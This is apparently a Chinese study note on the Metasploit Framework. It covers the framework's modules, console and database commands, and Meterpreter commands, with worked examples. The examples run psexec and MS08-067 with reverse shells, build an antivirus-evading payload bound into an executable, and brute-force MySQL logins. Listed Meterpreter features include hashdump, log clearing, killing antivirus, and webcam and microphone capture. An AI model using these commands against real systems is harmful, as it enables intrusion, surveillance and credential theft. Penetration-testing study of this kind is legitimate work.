---
title: MSF基本命令及实例
date: 2020-07-07
tags: 
  - 学习笔记
  - MSF
---
@[TOC](目录)
# MSF基本架构
![架构图](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMjkvbUc5MnVLelhOVXNoZDFZLnBuZw?x-oss-process=image/format,png)
## Rex
- 基本功能库，用于完成日常基本任务，无需人工手动编码实现
- 处理socker连接访问、协议应答（http/SSL/SMB等）
- 编码转换（XOR、Base64、Unicode）
## MSF::Core
- 提供Msf的核心基本API，是框架的核心能力实现库
## MSF::Base
- 提供友好的API接口，便于模块调用的库
## Plugin插件
- 连接和调用外部扩展功能和系统

## MSF数据库
### 恢复数据库
- msfdb reinit 初始化数据库

### 技术功能模块（不是流程模块）
> 都放置在/usr/share/metasploit-framework/modules/下

- Exploits：利用系统漏洞进行攻击的动作，此模块对应每一个具体漏洞的攻击方法（主动、被动）
- Payload：成功exploit之后，真正在目标系统执行的代码或指令
1. Shellcode或系统命令
2. 三种Payload：/usr/share/metasploit-framework/modules/payloads/
> （1）Single：all-in-one，所有内容都在一个payload<br>
> （2）Stager：目标计算机内存有限时，先传输一个较小的payload用于建立连接<br>
> （3）Stages：利用stager建立的连接下载的后续payload<br>
3. Stages、Stages都有多种类型，适用于不同场景
4. Shellcode是payload的一种，由于其建立正向/反向shell而得名
- Auxiliary：执行信息收集、枚举、指纹探测、扫描等功能的辅助模块（没有payload的exploit模块）
- Encoders：对payload进行加密，躲避AV检查的模块
- Nops：提高payload稳定性及维持大小


# MSF基本使用和控制台命令(MSFconsole)
## 更新
- apt install metasploit-framework


## 地位
- 最流行的用户接口
- 几乎可以使用所有MSF功能
- 控制台命令支持TAP自动补齐
- 支持外部命令的执行（系统命令等）
- 启动：msfconsole  / 安静的启动：msfconsole -q
- 退出：exit

## 帮助命令
- help  调出所有命令
- help workspace    查看命令详细用法
- workspace -h
- ? workspace

## MSF控制台基本命令
- banner —— 显示banner信息
- color —— 启用/禁用颜色提示 —— color true/false
- connect —— 连接服务器的指定端口获取工作在端口上工作的服务的banner信息 —— connect 192.168.1.1 80
- show —— 展示模块信息 —— show payloads
> show options ——显示需要设置的项（进入模块）
- search —— 搜索模块 —— search ms08-067
> search name:mysql cve:2020 platform:linux type:expoit
- load —— 调用外部插件 —— load nessus
- unload —— 删除外部插件 —— unload nessus
- loadpath —— 调用指定目录中的其他模块 —— loadpath 路径
- route —— 转发一个会话的其他子网的流量 —— route add 子网地址 子网掩码 sessionsID
- ird —— 开发环境
- resource —— 调用命令资源文件 —— 1.创建.rc文件输入一系列命令，2.msf>下,resource 路径/文件名3.也可以直接msfconsole -r 文件名

## 模块内基本命令
- use —— 使用模块 —— use exploit/windows/smb/ms08_067_netapi
- info —— 查看当前模块信息 
> 1. 基本信息
> 2. provided by：编者
> 3. Available targets：使用的系统版本
> 4. Basic options：需要设置的项
> 5. payload information：payload信息
- show options —— 显示需要设置的项
- show target —— 显示适用的系统版本
- show payloads —— 显示适用于当前模块的payloads
- show advanced —— 显示其他非必须项
- show evasion —— 做混淆
- show missing —— 显示还未设置的必须参数
- set —— 设置参数 —— set RHOST 1.1.1.1
- unset —— 取消设置
- setg —— 全局设置 —— setg RHOSTS 1.1.1.1
- unsetg —— 取消全局设置
- save —— 保存配置信息
- edit —— 查看或修改当前模块的源代码
- check —— 检查目标主机漏洞是否存在（并不是所有的模块都有check命令）
- run/exploit —— 运行模块（参数：-j表示后台执行）
- sessions —— 如果后台执行，输入这个命令可以查看当前已经建立的会话（参数：-i 2(id)进入会话）
- back —— 返回上一级

## 数据库操作
- db_rebuild_cache —— 在数据库添加索引，加快搜索速度
- db_disconnect —— 断开当前数据库连接
- db_connect —— 连接数据库 —— db_connect <user:pass>@<host:port>/<database>（或者指定配置文件完整路径，/usr/share/metasploit-framework/config/database.yml）
- db_nmap —— 集成nmap，扫描结果会保存在数据库中 —— 参数和nmap参数一样 
> 1. 查询数据库主机，hosts 123.57.251.23
> 2. 搜索, hosts -S linux
> 3. 端口信息, services -c port(要显示的列) -p 80(要搜索的端口)
- creds —— 查看获取到的登录的账号密码
- vulns —— 查看数据库中已查询到的主机漏洞信息
- loot —— 查看获取到的哈希值信息
- db_export —— 数据库导出 —— db_export -f xml /home/kali/test.xml
- db_import —— 数据库导入 —— db_import 文件名

## Exploit模块
### Active exploits（主动exploit）
> 利用服务器开放端口漏洞
- 实例：利用psexec远程执行漏洞攻击windows
```
use exploit/windows/smb/psexec      //使用Active exploit模块
set RHOST 192.168.126.129       //配置被攻击者Ip地址
set PAYLOAD windows/shell/reverse_tcp   //配置payload
set LHOST 192.168.1.1       //配置接收反弹shell的主机地址（本机地址）
set LPORT 4444      //配置接收反弹shell的主机端口
set SMBUSER user1   //配置被攻击者的管理员账号
set SMBPASS pass1   //配置被攻击者的管理员密码
exploit     //执行
```

### Passive exploits（被动exploit）
> 利用客户端程序漏洞
- 实例：利用ani_loadimage_chunksize模块攻击windows
```
use exploit/windows/browser/ani_loadimage_chunksize
set SRVHOST 192.168.126.131   //设置网站地址
set URIPATH /       //设置网站路径
set PAYLOAD windows/shell/reverse_tcp   //设置payload
set LHOST 192.168.1.1       //设置监听地址
set LPORT 4444              //设置监听端口
exploit
```

### 生成payload
- search shell_bind_tcp       //搜索payload
- use 40      //选择要使用的payload
- show options    //查看需要设置的参数，注意：在payload中，LPORT表示本地（被攻击者）要开放的端口，RHOST表示允许获取shell的远程主机IP
- generate    //生成16进制payload 
> 1. generate -b '\x00\xff'可以过滤掉坏字符）
> 2. generate -e x86/nonalpha  —— 手动指定encoder
> 3. generate -b '\x00' -t exe -e x86/shikata_ga_nai -i 5 -k -x /usr/share/windows-binaries/radmin.exe -f /root/1.exe
> 4. -b 排除坏字符，-t 输出什么格式，-e 指定encoder，-i 编码几轮，-k 不产生新的进程，-x 可以把payload绑定到的模板，-f /root/1.exe。
- nc 192.168.1.114 4444 —— 被攻击者点击文件后，开放4444端口，直接连接即可
- NOP(no-operation/Next Operation（无任何操作）)
> 1. EIP返回到存储NOP sled的任意地址时将递增，最终导致shellcode执行
> 2. generate -s 14（给payload加上14字节的nop前缀）

### Meterpreter
#### 简介
- 高级、动态、可扩展的Payload
> 1. 基于meterpreter上下文利用更多漏洞发起攻击
> 2. 后渗透测试阶段一站式操作界面
- 完全基于内存的DLL注入式payload（不写硬盘）
> 1. 注入合法系统进程并建立stager
> 2. 基于Stager上传和预加载DLL进行扩展模块的注入（客户端API）
> 3. 基于Stager建立的socket连接建立加密的TLS/1.0通信隧道
> 4. 利用TLS隧道进一步加载后续扩展模块（避免网络取证）
- 服务端用C语言编写
- 客户端提供基于ruby的全特性API（支持任何语言）

#### 常用命令
- set payload windows/metepreter/reverse_tcp  —— 配置payload的时候配置shell为meterpreter
- windows和linux命令大部否都支持（ls,dir,cd,cat,mkdir,rmdir.mv,rm,edit(编辑类似vi)）
- help  —— 帮助
- pwd —— 查看当前空座目录
- lpwd —— kali上当前工作目录
- lcd —— 在kali上切换目录
- run —— 运行脚本
- bgrun —— 后台运行脚本 —— bgrun vnc(打开桌面监控)/sound_recorder(打开麦克风)/webcam(打开摄像头)/killav(杀死杀毒软件)/winbf(用肉机暴力破解)/
- clearev —— 清除日志
- download —— 下载目标系统上的文件
- upload —— 上传文件
- execute —— 执行文件 —— execute -f cmd.exe -i -H （-f 执行什么程序，-i 交互，-H 隐藏）
- gituid —— 查看当前账户
- getsystem —— 提权到system
- getprivs —— 查看当前权限
- getproxy —— 获取代理
- ps —— 查看当前工作着的进程
- getpid —— 查看自己注入的进程pid
- migrate —— 迁移注入的进程 —— migrate 652
- hashdump —— 获取系统账号密码hash值
- sysinfo —— 查看系统信息
- kill —— 杀死进程 —— kill 1052
- reboot —— 重启
- shutdown —— 关机
- shell —— 获取操作系统shell
- show_mount —— 查看硬盘使用情况
- search —— 搜索文件 —— search -f data.ini
- arp —— 查看arp缓存
- netstat —— 查看端口开放情况
- ipconfig/ifconfig —— 查看ip地址
- idletime —— 查看操作系统空闲时间
- resource —— 调度外部资源文件（类似msf的resource）
- record_mic —— 记录麦克风出现的声音
- webcam_list —— 列出靶机上连接的所有摄像头
- webcam_snap -i -v false —— 每隔1秒拍个照

#### Meterpreter python扩展
- 2015年11月份，来自社区的贡献
- 无需运行环境，在客户端运行原生python代码
- load python （加载插件。meterpreter>环境下）
- Help
- python_execute "print("Hello world!")"
- python_execute "import os;cd = os.getcwd()" -r cd （-r 表示返回出来的变量）
- python_import -f find.py

# 实例
### 暴力破解mysql数据库密码
- 找到并使用mysql_login模块
```
search mysql_login
use mysql_login
```
- 查看需要设置的项
```
show options
```
- 设置主机，用户名，和密码字典
```
set RHOSTS 127.0.0.1
set USERNAME lrf
set BLANK_PASSWORDS true   //检测空密码
set PASS_FILE /home/kali/ruo.txt
```
- 执行
```
run/expoit    //出现绿色加号证明成功
```

### ms08-o67经典漏洞利用（xp）
- 找到并使用ms08-067
```
search ms08_067
use ms08_067_netapi
```
- 查看需要设置的项并挨个设置
```
show options
set RHOST 192.168.1.1
```
- 查看并设置主机系统版本
```
show targets
set target 34
```
- 查看并设置payloads
```
show payloads
set payload windows/shell/reverse_tcp
set lhost 192.168.1.1
```
- 执行
```
exploit
```


